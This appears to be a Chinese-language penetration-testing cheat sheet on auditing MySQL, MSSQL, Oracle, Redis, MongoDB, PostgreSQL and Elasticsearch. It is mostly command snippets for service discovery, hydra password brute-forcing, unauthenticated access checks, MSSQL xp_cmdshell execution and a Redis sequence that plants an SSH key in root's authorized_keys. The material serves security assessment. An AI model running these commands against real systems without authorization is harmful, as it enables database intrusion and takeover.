---
id: 02-004
title: "🗄️ 数据库安全评估 (Database Security Assessment)"
category: 漏洞扫描
category_en: "Vulnerability Scanning"
difficulty: ★★★
tools: "SQLMap, NoSQLMap, MDAT, AppDetective"
last_updated: 2025-07
tags: ["vulnerability-scanning", "web-security", "network-security", "database-security"]
subdomain: vulnerability-scanning
nist_csf: ["ID.RA-01", "DE.CM-08", "PR.IP-12"]
mitre_attack: ["T1595", "T1589", "T1592"]
---
# 🗄️ 数据库安全评估 (Database Security Assessment)

## 概述
评估数据库系统的安全配置和漏洞，包括弱密码、未授权访问、配置缺陷等。

## 核心技能

### 1. MySQL/MariaDB安全审计

```bash
# 发现MySQL服务
nmap -p3306 --script mysql* 192.168.1.0/24

# 弱口令爆破
hydra -L users.txt -P passwords.txt -f 192.168.1.100 mysql

# 未授权访问检测
mysql -h 192.168.1.100 -u root --skip-password

# MySQL安全配置检查
nmap -p3306 --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='pass',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" 192.168.1.100

# 枚举用户和数据库
mysql -h 192.168.1.100 -u root -p -e "
SELECT user, host, password_expired, account_locked FROM mysql.user;
SHOW DATABASES;
SELECT @@version;
SELECT @@basedir;
SELECT @@datadir;
SHOW VARIABLES LIKE '%secure%';
"
```

### 2. MSSQL安全审计

```bash
# 发现MSSQL服务
nmap -p1433 --script ms-sql* 192.168.1.0/24

# 口令爆破 - 使用impacket
impacket-mssqlclient -windows-auth domain/user:pass@192.168.1.100
# 使用hydra
hydra -L users.txt -P passwords.txt 192.168.1.100 mssql

# 枚举信息
# 使用mssql-cli（如果已安装）
mssql-cli -S 192.168.1.100 -U sa -P password
# 执行SQL查询
SELECT @@VERSION;
SELECT name FROM sys.databases;
SELECT name, is_srvrolemember('sysadmin') as is_admin FROM sys.server_principals;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmd_shell 'net user';

# 链接服务器检测
SELECT name, provider FROM sys.servers WHERE is_linked = 1;
```

### 3. Oracle安全审计

```bash
# 发现Oracle服务
nmap -p1521 --script oracle* 192.168.1.0/24

# 枚举SID
nmap -p1521 --script oracle-sid-brute 192.168.1.100

# 弱口令检测
nmap -p1521 --script oracle-brute --script-args oracle-brute.sids=XE 192.168.1.100

# ODAT - Oracle自动化工具
odat all -s 192.168.1.100 -d XE -U scott -P tiger
```

### 4. Redis安全审计

```bash
# 发现Redis服务
nmap -p6379 --script redis* 192.168.1.0/24

# 未授权访问检测
redis-cli -h 192.168.1.100 -p 6379
# 进入后执行：
INFO
KEYS *
CONFIG GET *

# 利用未授权访问写SSH密钥
redis-cli -h 192.168.1.100 -p 6379
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET ssh_key "ssh-rsa AAAAB3N...your-key"
SAVE

# Redis口令爆破
hydra -P passwords.txt 192.168.1.100 redis
```

### 5. MongoDB安全审计

```bash
# 发现MongoDB服务
nmap -p27017 --script mongodb* 192.168.1.0/24

# 未授权访问检测
mongo "mongodb://192.168.1.100:27017"
show dbs
use admin
db.system.users.find()

# 枚举信息
mongo 192.168.1.100:27017 --eval "db.adminCommand('getLog', 'global')"

# MongoDB爆破
nmap -p27017 --script mongodb-brute 192.168.1.100
```

### 6. PostgreSQL安全审计

```bash
# 发现PostgreSQL服务
nmap -p5432 --script pgsql* 192.168.1.0/24

# 弱口令爆破
hydra -L users.txt -P passwords.txt 192.168.1.100 postgres

# 连接测试
psql -h 192.168.1.100 -U postgres -d postgres

# 枚举信息
\du -- 列出用户
\l -- 列出数据库
SELECT version();
SELECT current_setting('password_encryption');
SELECT * FROM pg_hba_file_rules;
```

### 7. Cassandra/Elasticsearch审计

```bash
# Elasticsearch未授权检测
curl -s http://192.168.1.100:9200/
curl -s http://192.168.1.100:9200/_cat/indices
curl -s http://192.168.1.100:9200/_cluster/health?pretty

# Elasticsearch漏洞
nmap -p9200 --script elasticsearch* 192.168.1.100

# Cassandra
nmap -p9042 --script cassandra* 192.168.1.0/24
```

## 数据库默认端口速查

| 数据库 | 默认端口 | 认证方式 | 常见弱点 |
|:---|:---:|:---|:---|
| MySQL/MariaDB | 3306 | 用户名/密码 | 弱口令、空密码、文件读取 |
| MSSQL | 1433 | Windows/混合认证 | sa弱口令、xp_cmdshell |
| Oracle | 1521 | SID+用户名/密码 | 默认SID、默认密码 |
| PostgreSQL | 5432 | 用户名/密码 | 弱口令、pg_hba配置错误 |
| Redis | 6379 | 无/密码 | 未授权访问 |
| MongoDB | 27017 | 无/用户名密码 | 未授权访问 |
| Elasticsearch | 9200 | 无/HTTP认证 | 未授权访问 |
| Cassandra | 9042 | 用户名/密码 | 默认凭证 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| ODAT | Oracle自动化工具 | https://github.com/quentinhardy/odat |
| MDAT | MSSQL工具集 | https://github.com/quentinhardy/mdat |
| NoSQLMap | NoSQL注入工具 | https://github.com/codingo/NoSQLMap |
| sqlmap | SQL注入自动化 | https://github.com/sqlmapproject/sqlmap |
| Hydra | 口令爆破 | https://github.com/vanhauser-thc/thc-hydra |
| Medusa | 并行口令测试 | https://github.com/jmk-foofus/medusa |

## 参考资源
- [OWASP Database Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html)
- [MongoDB Security Checklist](https://docs.mongodb.com/manual/administration/security-checklist/)
- [Redis Security Guide](https://redis.io/topics/security)
